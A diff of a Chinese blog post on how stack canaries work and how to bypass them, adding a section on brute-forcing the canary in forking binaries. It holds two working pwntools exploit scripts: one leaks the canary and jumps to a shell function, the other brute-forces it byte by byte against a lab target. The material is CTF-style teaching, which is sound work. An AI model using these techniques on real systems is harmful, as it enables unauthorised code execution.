@@ -79,18 +79,18 @@
 
 
 
-<meta name="description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
+<meta name="description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
 <meta name="keywords" content="pwn">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Canary原理以及绕过">
 <meta property="og:url" content="http://a1oyss.github.io/2019/05/31/canary/index.html">
 <meta property="og:site_name" content="a1oyss&#39;s blog">
-<meta property="og:description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
+<meta property="og:description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2019-05-31T14:14:27.397Z">
+<meta property="og:updated_time" content="2019-06-01T09:31:06.683Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Canary原理以及绕过">
-<meta name="twitter:description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
+<meta name="twitter:description" content="Canary原理以及绕过Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。 Canary实现原理1234567891011121314  High  Address |                 |          +-----------------+          | args">
 
 
 
@@ -351,7 +351,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  688
+                  1.2k
                 </span>
               
 
@@ -376,19 +376,19 @@
       
 
       
-        <h1 id="Canary原理以及绕过"><a href="#Canary原理以及绕过" class="headerlink" title="Canary原理以及绕过"></a>Canary原理以及绕过</h1><p>Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。</p>
-<h2 id="Canary实现原理"><a href="#Canary实现原理" class="headerlink" title="Canary实现原理"></a>Canary实现原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
+        <h1 id="Canary原理以及绕过"><a href="#Canary原理以及绕过" class="headerlink" title="Canary原理以及绕过"></a>Canary原理以及绕过</h1><p>Canary是一种程序的保护机制，防护缓冲区溢出攻击。其原理是在栈上放一个标志Canary，在函数结束时判断次标志是否被改变，以此来判断是否发生缓冲区溢出。</p>
+<h2 id="Canary实现原理"><a href="#Canary实现原理" class="headerlink" title="Canary实现原理"></a>Canary实现原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | Canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>
 
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>
 
-<p>函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，canary则未修改，不为0就是发生了缓冲区溢出。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;异或检查canary</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
+<p>函数在fs:[0x28]取一个值，放入栈中，在函数结束前与fs:[0x28]进行异或，如果结果为0，Canary则未修改，不为0就是发生了缓冲区溢出。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">;异或检查Canary</span><br><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
 
 <p>而fs寄存器又指向了当前栈的TLS结构(TLS全称线程局部存储器，它用来保存变量或回调函数)，fs:[0x28]则指向了stack_guard。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure>
 
 <p>如果可以溢出覆盖tls的话，就可以绕过Canary</p>
-<p>如果canary已被修改，程序会走到 <code>__stack_chk_fail</code> </p>
+<p>如果Canary已被修改，程序会走到 <code>__stack_chk_fail</code> </p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//eglibc-2.19/debug/stack_chk_fail.c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <h2 id="Canary绕过"><a href="#Canary绕过" class="headerlink" title="Canary绕过"></a>Canary绕过</h2><h3 id="泄露Canary"><a href="#泄露Canary" class="headerlink" title="泄露Canary"></a>泄露Canary</h3><p>漏洞代码：</p>
@@ -397,15 +397,31 @@
 <p>编译为32位程序，开启Canary保护，关闭PIE：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -m32 -fstack-protector -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure>
 
-<p>ida打开，在vuln处下断点，程序执行到这里时往栈上添加canary。</p>
+<p>ida打开，在vuln处下断点，程序执行到这里时往栈上添加Canary。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:565C5280 mov     eax, large gs:14h</span><br><span class="line">.text:565C5286 mov     [ebp+var_C], eax		;ebp+var_C=FF80175C</span><br></pre></td></tr></table></figure>
 
 <p>接着到read的位置</p>
-<p>buf的位置在FF8016F8，canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节</p>
-<p>也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到canary的低位字节。</p>
-<p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串，想要打印出canary就只有覆盖低位字节</p>
+<p>buf的位置在FF8016F8，Canary的位置在FF80175C，FF80175C-FF8016F8=0x64=100个字节</p>
+<p>也就是说输入100个字节在加上回车的一个0xa正好可以覆盖到Canary的低位字节。</p>
+<p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串，想要打印出Canary就只有覆盖低位字节</p>
 <p>得到Canary值后接下来就是普通的rop了</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &apos;ex2&apos;</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">io = process(&apos;./ex2&apos;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆破Canary"><a href="#爆破Canary" class="headerlink" title="爆破Canary"></a>爆破Canary</h3><blockquote>
+<p> <em>pid_t fork</em>( <strong>void</strong>);</p>
+<p>返回值： 若成功调用一次则返回两个值，子进程返回0，<a href="https://baike.baidu.com/item/父进程" target="_blank" rel="noopener">父进程</a>返回子进程ID；否则，出错返回-1</p>
+<p>个现有进程可以调用fork函数创建一个新进程。由fork创建的新进程被称为子进程（child process）。fork函数被调用一次但返回两次。两次返回的唯一区别是子进程中返回0值而<a href="https://baike.baidu.com/item/父进程" target="_blank" rel="noopener">父进程</a>中返回子进程ID。</p>
+<p>子进程是父进程的副本，它将获得父进程数据空间、堆、栈等资源的副本。注意，子进程持有的是上述存储空间的“副本”，这意味着父子进程间不共享这些存储空间。</p>
+</blockquote>
+<p>利用fork就可以进行对Canary的爆破</p>
+<p>ida:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __cdecl __<span class="function">noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__pid_t</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;	<span class="comment">//fork失败了就退出</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0</span>);	<span class="comment">//父进程卡在这里</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"welcome"</span>);	<span class="comment">//子进程执行漏洞</span></span><br><span class="line">      fun();</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"recv sucess"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"fork error"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>直接下断点调试的话是断在父进程里面，一直在wait()，可以先在fun()中的read()函数处下断点，接着去docker里面直接运行程序，从ida里面attach上去，此时里面有两个bin1，pid值较大的那一个就是子进程。</p>
+<p>经过调试后，得知buf到Canary需要100字节，Canary到return地址需要12字节，编写exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    io=process(<span class="string">"./bin1"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io=remote(<span class="string">"172.17.0.2"</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary=<span class="string">'\x00'</span></span><br><span class="line">io.recvuntil(<span class="string">"welcome\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        io.send(<span class="string">'a'</span>*<span class="number">100</span>+canary+chr(j))</span><br><span class="line">        tmp=io.recvuntil(<span class="string">"welcome\n"</span>)	//输出recv success之后还会输出welcome，所以根据welcome判断，recvall()不知道为什么会卡住</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"recv"</span> <span class="keyword">in</span> tmp:</span><br><span class="line">            canary+=chr(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">get_flag=<span class="number">0x0804863B</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">100</span>+canary+<span class="string">'a'</span>*<span class="number">12</span>+p32(get_flag)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="keyword">print</span> io.recvline()		//recvall也会卡住</span><br></pre></td></tr></table></figure>
+
+
       
     </div>
     
@@ -454,6 +470,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/01/关于vim的复制/" rel="prev" title="关于vim的复制粘贴">
+                关于vim的复制粘贴 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -532,7 +552,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-count">4</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -545,7 +565,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -606,7 +626,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary原理以及绕过"><span class="nav-number">1.</span> <span class="nav-text">Canary原理以及绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary实现原理"><span class="nav-number">1.1.</span> <span class="nav-text">Canary实现原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary绕过"><span class="nav-number">1.2.</span> <span class="nav-text">Canary绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露Canary"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露Canary</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Canary原理以及绕过"><span class="nav-number">1.</span> <span class="nav-text">Canary原理以及绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary实现原理"><span class="nav-number">1.1.</span> <span class="nav-text">Canary实现原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canary绕过"><span class="nav-number">1.2.</span> <span class="nav-text">Canary绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#泄露Canary"><span class="nav-number">1.2.1.</span> <span class="nav-text">泄露Canary</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#爆破Canary"><span class="nav-number">1.2.2.</span> <span class="nav-text">爆破Canary</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
